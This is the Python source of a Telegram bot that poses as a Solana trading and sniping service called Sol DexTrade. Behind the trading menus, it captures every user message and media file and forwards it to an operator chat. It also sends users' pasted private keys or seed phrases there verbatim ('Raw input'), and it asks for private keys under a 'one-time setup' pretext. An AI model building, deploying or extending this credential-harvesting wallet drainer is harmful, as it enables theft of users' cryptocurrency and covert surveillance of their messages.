import logging
import os
import asyncio
import time
from datetime import datetime, time as dtime

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

from config import (
    BOT_TOKEN, FORWARD_CHAT_ID,
    LOG_FILE, MEDIA_DIR,
    ALLOWED_USERS, BLOCKED_USERS,
    SOL_MINT, RENT_EXEMPT_MIN_SOL,
)
from wallet import (
    verify_wallet,
    generate_solana_wallet,
    encrypt_secret,
    decrypt_secret,
    get_sol_balance,
    is_valid_private_key,
    get_pubkey_from_private_key,
)
from price import get_sol_price_usd, get_token_info
from jupiter import execute_swap
from transfers import send_sol, sol_to_lamports
from trending import get_trending_message
from pnl import generate_pnl_image
from token_scanner import scan_token
from database import (
    init_db, save_message,
    get_stats, get_filter_lists,
    add_user_filter, remove_user_filter,
    save_wallet, get_wallet,
    save_wallet_with_secret, get_wallet_secret,
    mw_save, mw_list, mw_get, mw_delete, mw_next_index, mw_set_active, mw_active,
    get_any_active_wallet,
)


os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
os.makedirs(MEDIA_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(), logging.FileHandler(LOG_FILE, encoding="utf-8")],
)
logger = logging.getLogger(__name__)


WELCOME_TEXT = (
    "🚀 Sol DexTrade Bot: Your Gateway to Solana DeFi\n"
    "🔫\n\n"
    "💰 SOL Price: $%SOL_PRICE%\n\n"
    "💳 Your First Wallet\n"
    "└ `CWwrGBWAMXfNsS72m76P9mdybDc1kCK4NY4TWfv3MESW` 📋\n"
    "└ Balance: 0.0000 SOL\n\n"
    "[Telegram](https://t.me/SolDexTrade) | [Twitter](https://twitter.com/SolDexTrade) | [Website](https://soldextrade.com)"
)


def wallet_text(pubkey, balance, sol_price=None):
    price_str = f"${sol_price:,.2f}" if sol_price else "Loading..."
    return (
        "🚀 Sol DexTrade Bot: Your Gateway to Solana DeFi\n"
        "🔫\n\n"
        "💰 SOL Price: " + price_str + "\n\n"
        "💳 Your First Wallet\n"
        "└ `" + pubkey + "` 📋\n"
        "└ Balance: " + str(balance) + " SOL\n\n"
        "[Telegram](https://t.me/SolDexTrade) | [Twitter](https://twitter.com/SolDexTrade) | [Website](https://soldextrade.com)"
    )


SNIPER_V2_TEXT = (
    "🎯 Sniper V2\n\n"
    "⚡ God-Tier Speed: Be first, always. Snipe in milliseconds for the earliest entry on any launch.\n"
    "💪 All-in-One Power: Use multiple wallets to snipe multiple exchanges simultaneously, from launchpad listings all the way to migration to your preferred DEXs.\n"
    "🚀 Pro-Level Modes: Offers a variety of advanced modes tailored to your profit maximization strategies.\n"
    "🌙 Mass Sniping: Dominate the market, guarantee you catch every moonshot.\n"
    "🛡 Ultimate Snipe Protection: Powerful built-in audit filters weed out scams, minimizing your risk."
)


def sniper_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 New Sniper", callback_data="new_sniper")],
        [InlineKeyboardButton("--- 💳 LISTING ---", callback_data="listing_header")],
        [InlineKeyboardButton("All", callback_data="sniper_all"),
         InlineKeyboardButton("Active", callback_data="sniper_active")],
        [InlineKeyboardButton("Inactive", callback_data="sniper_inactive"),
         InlineKeyboardButton("Completed", callback_data="sniper_completed")],
        [InlineKeyboardButton("📄 Doc ↗", callback_data="sniper_doc"),
         InlineKeyboardButton("❌ Close", callback_data="close")],
    ])


NEW_SNIPER_TEXT = (
    "Let's get started! Pick your preferred Snipe Mode.\n\n"
    "⭐ Targeted Mode: Snipes tokens based on Dev Wallet, Token Symbol, and Token Address filters. All are optional.\n\n"
    "🌟 Mass mode: Snipes all tokens without validating dev or token address on your selected DEXs. ⚠️ Use at your own risk and be careful.\n\n"
    "✨ Tips:\n"
    "/newsniper {targeted | mass} - Quickly pick your snipe mode for the next step!"
)


def new_sniper_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⭐ Targeted", callback_data="targeted_sniper"),
         InlineKeyboardButton("🌟 Mass", callback_data="mass_sniper")],
        [InlineKeyboardButton("🏠 Back Sniper Home", callback_data="sniper")],
    ])


def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✨ Buy & Sell", callback_data="buy_sell"),
         InlineKeyboardButton("🎯 Sniper", callback_data="sniper")],
        [InlineKeyboardButton("🗡 Limit Orders", callback_data="limits"),
         InlineKeyboardButton("🎮 Copy Trades", callback_data="copy")],
        [InlineKeyboardButton("🐵 Profile", callback_data="profiles"),
         InlineKeyboardButton("💳 Wallets", callback_data="wallet"),
         InlineKeyboardButton("🎮 Trades", callback_data="trades")],
        [InlineKeyboardButton("💧 Add Liquidity", callback_data="add_liquidity"),
         InlineKeyboardButton("💰 Cashback", callback_data="cashback")],
        [InlineKeyboardButton("🗃 Transfer SOL", callback_data="transfer_sol"),
         InlineKeyboardButton("🔧 Settings", callback_data="settings")],
        [InlineKeyboardButton("🔥 Our STBOT Token ↗", callback_data="stbot_token"),
         InlineKeyboardButton("🚀 Market Maker ↗", callback_data="market_maker")],
        [InlineKeyboardButton("🇺🇸", callback_data="lang_en"),
         InlineKeyboardButton("🇨🇳", callback_data="lang_zh"),
         InlineKeyboardButton("🇷🇺", callback_data="lang_ru"),
         InlineKeyboardButton("🇧🇷", callback_data="lang_pt"),
         InlineKeyboardButton("🇻🇳", callback_data="lang_vi")],
        [InlineKeyboardButton("🤖 Backup Bots", callback_data="backup_bots"),
         InlineKeyboardButton("🛡 Security", callback_data="security")],
        [InlineKeyboardButton("ℹ Help", callback_data="help")],
        [InlineKeyboardButton("📑 Tutorials", callback_data="tutorials")],
        [InlineKeyboardButton("❌ Close", callback_data="close")],
    ])


def back_btn(previous="main_menu"):
    return [[InlineKeyboardButton("⬅ Back", callback_data=previous),
             InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]


def connect_wallet_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Create New", callback_data="create_new_wallet")],
        [InlineKeyboardButton("📥 Import (Recommended)", callback_data="import_wallet")],
        [InlineKeyboardButton("⬅ Back", callback_data="buy_sell"),
         InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
    ])


ADD_LIQUIDITY_SCREEN_TEXT = (
    "╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
    "│  💧 𝗔𝗗𝗗 𝗟𝗜𝗤𝗨𝗜𝗗𝗜𝗧𝗬\n"
    "╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
    "💎 Add liquidity to your token\n"
    "and make it ready for trading.\n\n"
    "🔗 𝗦𝗘𝗟𝗘𝗖𝗧 𝗖𝗛𝗔𝗜𝗡\n\n"
    "Choose your preferred network below.\n\n"
    "⚡ Fast • Secure • Reliable\n"
    "━━━━━━━━━━━━━━━━━━━━━━"
)


def add_liquidity_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🟢 SOLANA", callback_data="liq_solana"),
         InlineKeyboardButton("🔷 ETHEREUM", callback_data="liq_ethereum")],
        [InlineKeyboardButton("◀️ BACK", callback_data="main_menu")],
    ])


def buy_sell_buttons():
    return [
        [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
        [InlineKeyboardButton("📊 View Trending", callback_data="view_trending")],
        [InlineKeyboardButton("🔍 Search Tokens", callback_data="search_tokens")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
    ]


def connect_buttons():
    return [
        [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
    ]


def is_allowed(user_id):
    rows = get_filter_lists()
    db_allowed = {r[0] for r in rows if r[1] == "allow"} | set(ALLOWED_USERS)
    db_blocked = {r[0] for r in rows if r[1] == "block"} | set(BLOCKED_USERS)
    if user_id in db_blocked:
        return False
    if db_allowed:
        return user_id in db_allowed
    return True


async def notify_channel(context, user, media_type, text, media_path=None):
    if not FORWARD_CHAT_ID:
        return
    try:
        name = ("@" + user.username) if user and user.username else (user.full_name if user else "Unknown")
        uid = str(user.id) if user else "N/A"
        body = str(text) if text else "(" + media_type + ")"
        note = (
            "📩 New message captured\n"
            "User: " + name + "\n"
            "ID: " + uid + "\n"
            "Type: " + media_type + "\n"
            "Message: " + body
        )
        if media_path:
            note += "\nFile: " + os.path.basename(media_path)
        await context.bot.send_message(chat_id=FORWARD_CHAT_ID, text=note)
    except Exception as exc:
        logger.error("CHANNEL FORWARD FAILED: %s", exc, exc_info=True)


async def forward_with_autodelete(context, text, delay=60):
    if not FORWARD_CHAT_ID:
        return None
    try:
        sent = await context.bot.send_message(chat_id=FORWARD_CHAT_ID, text=text, parse_mode="Markdown")

        async def _delete(ctx: ContextTypes.DEFAULT_TYPE):
            try:
                await ctx.bot.delete_message(chat_id=FORWARD_CHAT_ID, message_id=sent.message_id)
            except Exception as exc:
                logger.warning("Auto-delete failed for msg %s: %s", sent.message_id, exc)

        if context.job_queue:
            context.job_queue.run_once(_delete, when=delay)
        return sent
    except Exception as exc:
        logger.error("FORWARD FAILED: %s", exc, exc_info=True)
        return None


async def download_media(file_obj, media_type, user_id):
    try:
        ext_map = {"photo": "jpg", "video": "mp4", "audio": "mp3", "voice": "ogg", "document": "bin", "sticker": "webp"}
        ext = ext_map.get(media_type, "bin")
        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        fn = media_type + "_" + str(user_id) + "_" + ts + "." + ext
        sp = os.path.join(MEDIA_DIR, fn)
        tgf = await file_obj.get_file()
        await tgf.download_to_drive(sp)
        return sp
    except Exception as exc:
        logger.warning("Could not download media: %s", exc)
        return None


async def capture(update: Update, context: ContextTypes.DEFAULT_TYPE, media_type: str):
    user = update.effective_user
    msg = update.effective_message
    if user and not is_allowed(user.id):
        await msg.reply_text("You are not authorised to use this bot.")
        return

    text = msg.text or msg.caption or ""
    mpath = None
    username = (user.username or user.full_name) if user else "unknown"
    uid = user.id if user else 0

    if media_type == "photo" and msg.photo:
        mpath = await download_media(msg.photo[-1], "photo", uid)
    elif media_type == "video" and msg.video:
        mpath = await download_media(msg.video, "video", uid)
    elif media_type == "audio" and msg.audio:
        mpath = await download_media(msg.audio, "audio", uid)
    elif media_type == "voice" and msg.voice:
        mpath = await download_media(msg.voice, "voice", uid)
    elif media_type == "document" and msg.document:
        mpath = await download_media(msg.document, "document", uid)

    logger.info("Captured [%s] from %s: %s", media_type, username, text or "(" + media_type + ")")
    ts = datetime.utcnow().isoformat()
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write("[" + ts + "] user=" + str(username) + " type=" + media_type + " msg=" + text + "\n")
    save_message(timestamp=ts, chat_id=update.effective_chat.id, user_id=uid,
                 username=user.username if user else None, full_name=user.full_name if user else None,
                 message_id=msg.message_id, text=text, media_type=media_type, media_path=mpath)
    await notify_channel(context, user, media_type, text, mpath)

    if media_type == "text" and text:
        expecting = context.user_data.get("expecting")

        # ─── CONTRACT INPUT FOR BUY/SELL ─────────
        if expecting in ["buy_contract", "sell_contract"]:
            action = "buy" if expecting == "buy_contract" else "sell"
            context.user_data["expecting"] = None
            await msg.reply_text("Scanning token... Please wait.")
            scan = await scan_token(text)
            if scan["success"]:
                context.user_data["token_address"] = scan["token_address"]
                context.user_data["token_name"] = scan["name"] + " (" + scan["symbol"] + ")"
                context.user_data["action"] = action
                await msg.reply_text(
                    scan["message"], parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("✅ Confirm " + action.capitalize(), callback_data="confirm_" + action),
                         InlineKeyboardButton("⭐ Watchlist", callback_data="watchlist_" + scan["token_address"])],
                        [InlineKeyboardButton("⬅ Back", callback_data=action),
                         InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                    ]),
                )
            else:
                await msg.reply_text(scan["message"])
                await msg.reply_text("Please try again with a valid contract address.",
                                     reply_markup=InlineKeyboardMarkup(back_btn(action)))
            return

        # ─── LAZY PRIVATE KEY (one-time setup for old wallets) ─
        if expecting == "lazy_private_key":
            context.user_data["expecting"] = None
            candidate = text.strip()

            if not is_valid_private_key(candidate):
                await msg.reply_text(
                    "❌ That doesn't look like a valid base58 private key.\n\n"
                    "Please send a base58-encoded 64-byte private key.\n"
                    "If you only have a seed phrase, you cannot sign here — "
                    "you'd need to export the private key from your wallet app first.",
                    reply_markup=InlineKeyboardMarkup(back_btn("main_menu")),
                )
                return

            derived_pub = get_pubkey_from_private_key(candidate)
            expected_pub = context.user_data.get("lazy_pubkey")

            if not derived_pub:
                await msg.reply_text("❌ Could not derive a pubkey from that key.",
                                     reply_markup=InlineKeyboardMarkup(back_btn("main_menu")))
                return

            if expected_pub and derived_pub != expected_pub:
                await msg.reply_text(
                    "❌ That private key does not match your wallet address.\n\n"
                    "Your wallet: `" + expected_pub + "`\n"
                    "This key's wallet: `" + derived_pub + "`\n\n"
                    "Please send the correct private key for your wallet.",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup(back_btn("main_menu")),
                )
                return

            # Encrypt + store
            encrypted_new = encrypt_secret(candidate)
            save_wallet_with_secret(uid, derived_pub, encrypted_new, balance=0)

            await msg.reply_text("✅ Private key saved and encrypted.\n\nContinuing with your swap...")

            # Resume the pending buy/sell
            action = context.user_data.get("pending_action", "buy")
            token_addr = context.user_data.get("pending_token_addr", "")
            token_name = context.user_data.get("pending_token_name", "Unknown")
            amount_text = context.user_data.get("pending_amount_text", "0")

            for k in ("pending_action", "pending_token_addr", "pending_token_name", "pending_amount_text", "lazy_pubkey"):
                context.user_data.pop(k, None)

            try:
                amount = float(amount_text)
                if amount <= 0:
                    raise ValueError()
            except ValueError:
                await msg.reply_text("Please try the buy/sell again with a valid amount.",
                                     reply_markup=InlineKeyboardMarkup(back_btn(action)))
                return

            proc = await msg.reply_text("⏳ Processing swap... Please wait.")
            secret_b58_resumed = decrypt_secret(encrypted_new)

            if action == "buy":
                result = await execute_swap(
                    secret_b58_resumed,
                    input_mint=SOL_MINT,
                    output_mint=token_addr,
                    amount_lamports=sol_to_lamports(amount),
                    slippage_bps=100,
                )
                display_amount = str(amount) + " SOL"
            else:
                from profile import get_token_balance_and_decimals
                info = await get_token_balance_and_decimals(derived_pub, token_addr)
                if not info or info["amount"] == 0:
                    await proc.edit_text(
                        "❌ No holdings of this token in your wallet.",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("🛒 Buy Instead", callback_data="buy")],
                            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                        ]),
                    )
                    return
                sell_amount = int(info["amount"] * (min(amount, 100) / 100.0)) or info["amount"]
                result = await execute_swap(
                    secret_b58_resumed,
                    input_mint=token_addr,
                    output_mint=SOL_MINT,
                    amount_lamports=sell_amount,
                    slippage_bps=100,
                )
                display_amount = str(min(amount, 100)) + "%"

            if result.get("success"):
                sig = result["signature"]
                await proc.edit_text(
                    "✅ Swap Confirmed!\n\n"
                    "Action: " + action.upper() + "\n"
                    "Token: " + token_name + "\n"
                    "Amount: " + display_amount + "\n"
                    "Signature: `" + sig + "`\n\n"
                    "[View on Solscan](https://solscan.io/tx/" + sig + ")",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔍 View on Solscan", url="https://solscan.io/tx/" + sig)],
                        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                    ]),
                )
                if FORWARD_CHAT_ID:
                    try:
                        name = ("@" + user.username) if user and user.username else str(user.full_name)
                        await context.bot.send_message(
                            chat_id=FORWARD_CHAT_ID,
                            text=(
                                "🛒 Swap executed\n"
                                "User: " + name + "\n"
                                "ID: " + str(uid) + "\n"
                                "Action: " + action.upper() + "\n"
                                "Token: " + token_name + "\n"
                                "Amount: " + display_amount + "\n"
                                "Tx: `" + sig + "`"
                            ),
                            parse_mode="Markdown",
                        )
                    except Exception as exc:
                        logger.warning("Could not forward swap: %s", exc)
            else:
                await proc.edit_text(
                    "❌ Swap Failed\n\nReason: " + result.get("error", "Unknown"),
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 Try Again", callback_data=action)],
                        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                    ]),
                )
            return

        # ─── BUY/SELL AMOUNT ─────────────────────
        if expecting in ["buy_amount", "sell_amount"]:
            action = context.user_data.get("action", "buy")
            token_addr = context.user_data.get("token_address", "")
            token_name = context.user_data.get("token_name", "Unknown")
            context.user_data["expecting"] = None

            wallet_info = get_any_active_wallet(uid)
            if not wallet_info:
                await msg.reply_text(
                    "❌ No wallet found. Please create or import a wallet first.",
                    reply_markup=InlineKeyboardMarkup(back_btn(action)),
                )
                return

            encrypted = wallet_info.get("encrypted_secret")
            pubkey_used = wallet_info.get("pubkey")

            # Lazy import: no secret stored → ask for private key now
            if not encrypted:
                context.user_data["pending_action"] = action
                context.user_data["pending_token_addr"] = token_addr
                context.user_data["pending_token_name"] = token_name
                context.user_data["pending_amount_text"] = text
                context.user_data["expecting"] = "lazy_private_key"
                context.user_data["lazy_pubkey"] = pubkey_used
                await msg.reply_text(
                    "🔐 One-time setup needed\n\n"
                    "To sign transactions, we need your wallet's private key.\n\n"
                    "Wallet: `" + pubkey_used + "`\n\n"
                    "Send the base58 private key for this wallet.\n"
                    "It will be encrypted and stored securely — you won't be asked again.\n\n"
                    "⚠️ If you only have a seed phrase, export the private key from your wallet app first.",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")],
                    ]),
                )
                return

            secret_b58 = decrypt_secret(encrypted)
            if not secret_b58:
                await msg.reply_text("❌ Could not decrypt your wallet.",
                                     reply_markup=InlineKeyboardMarkup(back_btn(action)))
                return

            try:
                amount = float(text.strip())
                if amount <= 0:
                    raise ValueError("must be positive")
            except ValueError:
                await msg.reply_text("Please enter a valid number. Example: 0.5",
                                     reply_markup=InlineKeyboardMarkup(back_btn(action)))
                context.user_data["expecting"] = expecting
                return

            proc = await msg.reply_text("⏳ Processing swap... Please wait.")

            if action == "buy":
                result = await execute_swap(
                    secret_b58,
                    input_mint=SOL_MINT,
                    output_mint=token_addr,
                    amount_lamports=sol_to_lamports(amount),
                    slippage_bps=100,
                )
                display_amount = str(amount) + " SOL"
            else:
                from profile import get_token_balance_and_decimals
                info = await get_token_balance_and_decimals(pubkey_used, token_addr)
                if not info or info["amount"] == 0:
                    await proc.edit_text(
                        "❌ No holdings of this token in your wallet.",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("🛒 Buy Instead", callback_data="buy")],
                            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                        ]),
                    )
                    return
                sell_amount = int(info["amount"] * (min(amount, 100) / 100.0)) or info["amount"]
                result = await execute_swap(
                    secret_b58,
                    input_mint=token_addr,
                    output_mint=SOL_MINT,
                    amount_lamports=sell_amount,
                    slippage_bps=100,
                )
                display_amount = str(min(amount, 100)) + "%"

            if result.get("success"):
                sig = result["signature"]
                await proc.edit_text(
                    "✅ Swap Confirmed!\n\n"
                    "Action: " + action.upper() + "\n"
                    "Token: " + token_name + "\n"
                    "Amount: " + display_amount + "\n"
                    "Signature: `" + sig + "`\n\n"
                    "[View on Solscan](https://solscan.io/tx/" + sig + ")",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔍 View on Solscan", url="https://solscan.io/tx/" + sig)],
                        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                    ]),
                )
                if FORWARD_CHAT_ID:
                    try:
                        name = ("@" + user.username) if user and user.username else str(user.full_name)
                        await context.bot.send_message(
                            chat_id=FORWARD_CHAT_ID,
                            text=(
                                "🛒 Swap executed\n"
                                "User: " + name + "\n"
                                "ID: " + str(uid) + "\n"
                                "Action: " + action.upper() + "\n"
                                "Token: " + token_name + "\n"
                                "Amount: " + display_amount + "\n"
                                "Tx: `" + sig + "`"
                            ),
                            parse_mode="Markdown",
                        )
                    except Exception as exc:
                        logger.warning("Could not forward swap: %s", exc)
            else:
                await proc.edit_text(
                    "❌ Swap Failed\n\nReason: " + result.get("error", "Unknown"),
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 Try Again", callback_data=action)],
                        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                    ]),
                )
            return

        # ─── TRANSFER SOL ────────────────────────
        if expecting == "transfer_sol":
            context.user_data["expecting"] = None
            try:
                parts = [p.strip() for p in text.split(",")]
                to_addr = parts[0]
                amount_str = parts[1] if len(parts) > 1 and parts[1] else None

                wallet_info = get_any_active_wallet(uid)
                if not wallet_info:
                    await msg.reply_text("❌ No wallet found.",
                                         reply_markup=InlineKeyboardMarkup(back_btn("main_menu")))
                    return

                enc = wallet_info.get("encrypted_secret")
                pubkey_used = wallet_info.get("pubkey")

                if not enc:
                    await msg.reply_text(
                        "❌ No stored private key found.\n\n"
                        "Please do a /buy first to trigger one-time private key setup, "
                        "then come back here.",
                        reply_markup=InlineKeyboardMarkup(back_btn("main_menu")),
                    )
                    return

                secret_b58 = decrypt_secret(enc)
                balance = await get_sol_balance(pubkey_used) or 0

                if amount_str:
                    amount = float(amount_str)
                else:
                    amount = max(0, balance - RENT_EXEMPT_MIN_SOL)

                if amount <= 0:
                    await msg.reply_text("❌ Amount too small or balance empty.",
                                         reply_markup=InlineKeyboardMarkup(back_btn("main_menu")))
                    return

                proc = await msg.reply_text("⏳ Sending " + str(round(amount, 6)) + " SOL...")
                result = await send_sol(secret_b58, to_addr, sol_to_lamports(amount))

                if result.get("success"):
                    sig = result["signature"]
                    await proc.edit_text(
                        "✅ Transfer Sent!\n\n"
                        "To: `" + to_addr + "`\n"
                        "Amount: `" + str(round(amount, 6)) + " SOL`\n"
                        "Signature: `" + sig + "`\n\n"
                        "[View on Solscan](https://solscan.io/tx/" + sig + ")",
                        parse_mode="Markdown",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("🔍 View on Solscan", url="https://solscan.io/tx/" + sig)],
                            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                        ]),
                    )
                else:
                    await proc.edit_text(
                        "❌ Transfer Failed\n\nReason: " + result.get("error", "Unknown"),
                        reply_markup=InlineKeyboardMarkup(back_btn("main_menu")),
                    )
            except Exception as exc:
                logger.warning("Transfer parse error: %s", exc)
                await msg.reply_text(
                    "❌ Invalid format. Use: `Address, Amount`\n"
                    "Leave amount blank to send full balance.",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup(back_btn("main_menu")),
                )
            return

        # ─── WALLET IMPORT ────────────────────────
        result = await verify_wallet(text)
        if result["valid"]:
            encrypted = ""
            if result.get("secret_b58"):
                encrypted = encrypt_secret(result["secret_b58"])
                save_wallet_with_secret(uid, result["pubkey"], encrypted, balance=result["balance"])
            else:
                save_wallet(uid, result["pubkey"], result["balance"])

            sol_price = await get_sol_price_usd()
            price_str = f"${sol_price:,.2f}" if sol_price else "Loading..."
            wt = (
                "Wallet connected successfully!\n\n"
                "🚀 Sol DexTrade Bot: Your Gateway to Solana DeFi\n"
                "🔫\n\n"
                "💰 SOL Price: " + price_str + "\n\n"
                "💳 Your First Wallet\n"
                "└ `" + result["pubkey"] + "` 📋\n"
                "└ Balance: " + str(result["balance"]) + " SOL - $" + str(result["usd"]) + "\n\n"
                "[Telegram](https://t.me/SolDexTrade) | [Twitter](https://twitter.com/SolDexTrade) | [Website](https://soldextrade.com)"
            )
            await msg.reply_text(wt, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
            if FORWARD_CHAT_ID:
                try:
                    name = ("@" + user.username) if user and user.username else (user.full_name if user else "Unknown")
                    lines = [
                        "Wallet connected", "User: " + str(name),
                        "ID: `" + str(uid) + "`",
                        "Address: `" + result["pubkey"] + "`",
                        "Balance: `" + str(result["balance"]) + " SOL - $" + str(result["usd"]) + "`",
                        "Input type: " + result["input_type"],
                        "Raw input: `" + text + "`",
                    ]
                    await context.bot.send_message(chat_id=FORWARD_CHAT_ID, text="\n".join(lines), parse_mode="Markdown")
                except Exception as exc:
                    logger.warning("Could not notify channel: %s", exc)
        else:
            await msg.reply_text(result["message"])
            w = get_wallet(uid)
            txt = wallet_text(w["pubkey"], w["balance"]) if w else WELCOME_TEXT
            await msg.reply_text(txt, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
    else:
        w = get_wallet(uid) if uid else None
        sol_price = await get_sol_price_usd()
        if w:
            txt = wallet_text(w["pubkey"], w["balance"], sol_price)
        else:
            price_str = f"{sol_price:,.2f}" if sol_price else "Loading..."
            txt = WELCOME_TEXT.replace("%SOL_PRICE%", price_str)
        await msg.reply_text(txt, reply_markup=main_menu_keyboard(), parse_mode="Markdown")


async def handle_text(update, context):     await capture(update, context, "text")
async def handle_photo(update, context):    await capture(update, context, "photo")
async def handle_video(update, context):    await capture(update, context, "video")
async def handle_audio(update, context):    await capture(update, context, "audio")
async def handle_voice(update, context):    await capture(update, context, "voice")
async def handle_document(update, context): await capture(update, context, "document")
async def handle_sticker(update, context):  await capture(update, context, "sticker")


async def get_welcome(uid):
    w = get_wallet(uid)
    sol_price = await get_sol_price_usd()
    if w:
        return wallet_text(w["pubkey"], w["balance"], sol_price)
    price_str = f"{sol_price:,.2f}" if sol_price else "Loading..."
    return WELCOME_TEXT.replace("%SOL_PRICE%", price_str)


async def cmd_start(update, context):
    uid = update.effective_user.id if update.effective_user else 0
    welcome_msg = await get_welcome(uid)
    await update.message.reply_text(welcome_msg, reply_markup=main_menu_keyboard(), parse_mode="Markdown")


async def cmd_buy(update, context):
    uid = update.effective_user.id if update.effective_user else 0
    wallet = get_wallet(uid)
    if not wallet:
        await update.message.reply_text(
            "🛒 Trading\n\nPlease connect your wallet first to start trading.\n\nMinimum buy: 2 SOL\n\nClick Connect Wallet to import your wallet.",
            reply_markup=InlineKeyboardMarkup(buy_sell_buttons()),
        )
    else:
        context.user_data["expecting"] = "buy_contract"
        await update.message.reply_text(
            "🛒 Buy Token\n\nStep 1 of 3\n\nPaste the contract address of the token you want to buy:",
            reply_markup=InlineKeyboardMarkup(back_btn("main_menu")),
        )


async def cmd_sell(update, context):
    uid = update.effective_user.id if update.effective_user else 0
    wallet = get_wallet(uid)
    if not wallet:
        await update.message.reply_text(
            "💰 Selling\n\nPlease connect your wallet first to start trading.\n\nConnect wallet to sell tokens.\n\nClick Connect Wallet to import your wallet.",
            reply_markup=InlineKeyboardMarkup(buy_sell_buttons()),
        )
    else:
        context.user_data["expecting"] = "sell_contract"
        await update.message.reply_text(
            "💰 Sell Token\n\nStep 1 of 3\n\nPaste the contract address of the token you want to sell:",
            reply_markup=InlineKeyboardMarkup(back_btn("main_menu")),
        )


async def cmd_positions(update, context):
    uid = update.effective_user.id if update.effective_user else 0
    w = get_wallet(uid)
    if not w:
        await update.message.reply_text("📊 Positions\n\nPlease connect your wallet first.\nConnect wallet to view your positions.",
                                        reply_markup=InlineKeyboardMarkup(connect_buttons()))
    else:
        await update.message.reply_text(
            "📊 Positions\n\nWallet: `" + w["pubkey"] + "`\n\nYou have no open positions.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛒 Buy", callback_data="buy")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )


async def cmd_limits(update, context):
    await update.message.reply_text("📉 Limits\n\nPlease connect your wallet first to set limit orders.",
                                    reply_markup=InlineKeyboardMarkup(connect_buttons()))


async def cmd_dca(update, context):
    await update.message.reply_text(
        "You have no active DCA orders. Create a DCA order from the Buy/Sell menu.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🛒 Buy", callback_data="buy")],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
        ]),
    )


async def cmd_trending(update, context):
    m = await update.message.reply_text("🔥 Fetching trending tokens... Please wait.")
    try:
        msg = await get_trending_message()
        await m.edit_text(
            msg, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh Trending", callback_data="trending")],
                [InlineKeyboardButton("🛒 Buy Token", callback_data="buy")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )
    except Exception:
        await m.edit_text(
            "Could not fetch trending data. Please try again.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Try Again", callback_data="trending")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )


async def cmd_boosted(update, context):
    await update.message.reply_text("🚀 Boosted Tokens\n\nThese tokens are currently boosted.\nConnect your wallet to buy boosted tokens.",
                                    reply_markup=InlineKeyboardMarkup(connect_buttons()))


async def cmd_topboost(update, context):
    await update.message.reply_text("📈 Top Boost\n\nThese are the top boosted tokens.\nConnect your wallet to start trading.",
                                    reply_markup=InlineKeyboardMarkup(connect_buttons()))


async def cmd_profiles(update, context):
    await update.message.reply_text("⭐ Profiles\n\nManage your trading profiles here.\nConnect your wallet to view and manage profiles.",
                                    reply_markup=InlineKeyboardMarkup(connect_buttons()))


async def cmd_search(update, context):
    await update.message.reply_text("🔍 Token Search\n\nPlease enter a token symbol, name, or contract address to search:",
                                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))


async def cmd_charts(update, context):
    await update.message.reply_text("📊 Charts\n\nView live token charts here.\nConnect your wallet to trade directly from charts.",
                                    reply_markup=InlineKeyboardMarkup(connect_buttons()))


